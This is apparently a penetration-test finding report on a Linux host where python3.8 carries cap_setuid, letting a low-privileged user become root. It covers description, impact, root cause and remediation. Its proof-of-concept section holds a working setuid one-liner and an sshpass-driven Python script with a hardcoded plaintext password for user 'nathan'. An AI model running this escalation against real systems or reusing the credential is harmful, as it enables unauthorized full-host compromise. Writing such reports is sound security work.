# Local Privilege Escalation via Misconfigured Python Capability (cap_setuid+eip)

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-27 09:27:56 UTC
**Target:** 10.129.6.82
**CWE:** CWE-250
**CVSS:** 7.8

## Description

A local privilege escalation vulnerability was confirmed on the target host due to an unsafe Linux file capability assignment on the Python interpreter. The binary `/usr/bin/python3.8` is configured with `cap_setuid+eip`, allowing a non-privileged user to invoke `setuid(0)` from Python and execute commands with root privileges.

The issue was validated after obtaining a standard user shell as `nathan`. Post-authentication enumeration showed dangerous capabilities on the Python binary, and direct privilege escalation to root was achieved in a single command. This is a complete privilege boundary break from a regular user context to full system administration.

## Impact

An attacker with access to any low-privileged local account can gain full root control of the host. This enables unrestricted access to sensitive data, modification of system configuration, disabling of security controls, persistence installation, and complete compromise of confidentiality, integrity, and availability for the affected system.

## Technical Analysis

The root cause is excessive privilege assignment through Linux capabilities. `cap_setuid` grants the ability to change process UID, and when applied to a general-purpose interpreter, it effectively provides a reusable privilege escalation primitive.

Because Python can execute arbitrary code, assigning `cap_setuid+eip` to `python3.8` permits any local user who can run the binary to perform `os.setuid(0)` and execute arbitrary commands as root. This bypasses normal sudo policy and least-privilege controls.

Observed validation chain:
1) Low-privileged SSH session established as user `nathan`.
2) Capability enumeration (`getcap -r / 2>/dev/null`) showed `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`.
3) Python command using `os.setuid(0)` successfully switched EUID to root.
4) Root-level command execution and privileged file access were confirmed.

## Proof of Concept

Reproduction steps:

1. Authenticate to the target as a non-root user (example: `nathan`).
2. Enumerate capabilities:
   `getcap -r / 2>/dev/null | grep python3.8`
3. Confirm vulnerable output includes:
   `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`
4. Execute privilege escalation:
   `python3.8 -c 'import os; os.setuid(0); os.system("id && whoami")'`
5. Observe root context in output (`uid=0(root)` and `whoami` returns `root`).

This demonstrates reliable local privilege escalation from standard user to root.

```
import subprocess

TARGET = "10.129.6.82"
USER = "nathan"
PASSWORD = "Buck3tH4TF0RM3!"

def run_remote(cmd: str) -> str:
    ssh_cmd = [
        "sshpass", "-p", PASSWORD,
        "ssh",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        f"{USER}@{TARGET}",
        cmd
    ]
    res = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30)
    return (res.stdout + res.stderr).strip()

def main():
    print("[*] Checking Python capabilities...")
    print(run_remote("getcap -r / 2>/dev/null | grep python3.8 || true"))
    print("\n[*] Attempting privilege escalation via cap_setuid...")
    privesc = r"""python3.8 -c 'import os; os.setuid(0); os.system("id; whoami")'"""
    print(run_remote(privesc))

if __name__ == "__main__":
    main()
```

## Remediation

1. Remove dangerous capabilities from the Python interpreter immediately:
   `sudo setcap -r /usr/bin/python3.8`

2. Reassess why elevated capabilities were applied and move required privileged actions into narrowly scoped, audited wrappers instead of granting privileges to a full interpreter.

3. Apply least-privilege hardening:
   - Restrict executable permissions where possible.
   - Avoid assigning `cap_setuid` to multi-purpose binaries.
   - Review all capabilities regularly with `getcap -r /`.

4. Rotate credentials and investigate for potential abuse, as this issue allows silent full-host takeover after any user-level access.

5. Add detection controls for anomalous capability usage and unexpected root process creation from user-owned sessions.
